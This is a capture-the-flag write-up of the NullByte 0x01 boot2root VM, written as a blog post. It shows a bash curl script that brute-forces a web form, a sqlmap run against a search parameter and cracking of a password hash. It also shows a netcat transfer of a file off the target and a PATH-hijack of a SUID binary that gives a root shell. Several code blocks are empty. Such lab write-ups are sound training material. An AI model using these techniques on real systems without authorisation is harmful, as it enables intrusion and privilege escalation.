I saw this boot2root announced on [Twitter](https://twitter.com/ly0nx/status/627625979041697792) by [ly0nx](https://twitter.com/ly0nx) and decided to give it a go. It's not on VulnHub yet, but it looks like it might make it there sometime after Blackhat and Defcon is over. The boot2root is called NullByte 0x01 and is described as beginner/intermediate level challenge. I thought it was pretty easy, but still a fun challenge nonetheless. You can grab it at [http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/](http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/).

I found the IP address of the target using netdiscover, and ran a full portscan on it. This returned the following results: 

```
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
56763/tcp open  status  1 (RPC #100024)
111/udp  open  rpcbind
5353/udp open  zeroconf
```

Web server on port 80, and SSH on non-standard port 777. I loaded up the web site on my browser:

I ran nikto and wfuzz on the web server as well and came up with a handful of interesting directories, but nothing that I could leverage at the moment: 

```

Back to the web page, I decided to examine the image main.gif. Running exiftool on it revealed something interesting in the comments section: 

```

```

At first I thought kzMb5nVYJw was some kind of encrypted text. I tried simple ciphers like ROT13 and Caesar, but nothing returned anything interesting. I tried using it as a password, but that didn't work. What eventually did work was using it in the URL: 


![](/images/2015-08-06/02.png)

It was a form asking for a key. Viewing the source revealed a clue: 

```html
<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form> 
</center>
<!-- this form isn't connected to mysql, password ain't that complex --!>
```

Ok, so looks like I had to brute force a password. Not the most enjoyable thing, but necessary to continue. After trying several small wordlists, the winner was /usr/share/dict/words. I wrote the following script to brute force the password for me: 

```bash
#!/bin/bash

passwdlist=$1
echo "Brute forcing key..."
while read password; do 
    out=`curl -s -d "key=${password}" http://192.168.107.135/kzMb5nVYJw/index.php`
    echo ${out} | grep "invalid key" >/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "Found key \e[32m${password}"
        break
    fi 
done < ${passwdlist}
```

And here it is in action: 

```text
# ./brute.sh /usr/share/dict/words
Brute forcing key...
Found key elite
```

Took a few minutes, but I found the key. I punched it in and was greeted with yet another form. This time it was asking for a username to look up:

![](/images/2015-08-06/03.png)

Viewing the source revealed another PHP file; 420search.php:  

```html
<p>Search for usernames: </p>
<hr>
<form action="420search.php" method="get">
Enter username:<br>
<input type="text" name="usrtosearch">
</form>
```

Accessing the URL for this revealed some interesting leaks: 

![](/images/2015-08-06/04.png)

Two usernames, IDs, and positions. It looked like fields in a database. While the previous form wasn't connected to a database, I was betting that this one was. Searching for username resulted in the following URL: http://192.168.107.135/kzMb5nVYJw/420search.php?usrtosearch=ramses

I figured usrtosearch might be vulnerable to SQL injection, so I ran sqlmap against it:

```text

There's a Base64 MD5 hash for ramses' password. To crack it, I just Googled it:

![](/images/2015-08-06/05.png)

Password was omega, and it turned out those were the SSH credentials for ramses. 

```
# ssh -p777 ramses@192.168.107.135
ramses@192.168.107.135's password:

ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
ramses@NullByte:~$
```

A quick scan around the files in ramses' directory revealed some interesting information in the .bash_history file:

```
ramses@NullByte:~$ cat .bash_history 
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch 
clear
sudo -s
cd /
ls
exit
```

Looks like there was something called procwatch in /var/www/backup. This file was SUID root, which made me suspect that it might be exploitable in some way. 

```
ramses@NullByte:~$ ls -l /var/www/backup/procwatch 
-rwsr-xr-x 1 root root 4932 Aug  2 01:29 /var/www/backup/procwatch
```

procwatch appeared to just run ps:

```
ramses@NullByte:~$ /var/www/backup/procwatch 
  PID TTY          TIME CMD
 1430 pts/0    00:00:00 procwatch
 1431 pts/0    00:00:00 sh
 1432 pts/0    00:00:00 ps
```

So I decided to transfer the binary over to my machine for further examination. I setup a netcat listener to receive procwatch and used netcat on the target to send it over. 

```
ramses@NullByte:/var/www/backup$ nc 192.168.107.129 4444 < procwatch 
```

With the binary on hand, I loaded it up in gdb to see what was going on:

```
# gdb -q procwatch 
Reading symbols from /root/nullbyte/procwatch...(no debugging symbols found)...done.
gdb-peda$ pdisass main
Dump of assembler code for function main:

```

I set a breakpoint at the call to system() and ran it. Once it hit the breakpoint, I looked at the arguments being passed to system:

```
Guessed arguments:
arg[0]: 0xfff4906e --> 0x7370 ('ps')
arg[1]: 0x0 
arg[2]: 0xc2 
arg[3]: 0xf76735a6 (test   eax,eax)
```

Sure enough, it was running ps, but without an absolute path. That meant I could trick the binary into running my own ps as long as I made the current directory the priority in my PATH environment. 

Back on the target I updated my PATH environment and symlinked /bin/sh into ps. Running procwatch again gave me a root shell:

```
ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
ramses@NullByte:/var/www/backup$ ln -s /bin/sh ps
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

All that was left was to read the flag:

```
# ls /root

# cat /root/proof.txt
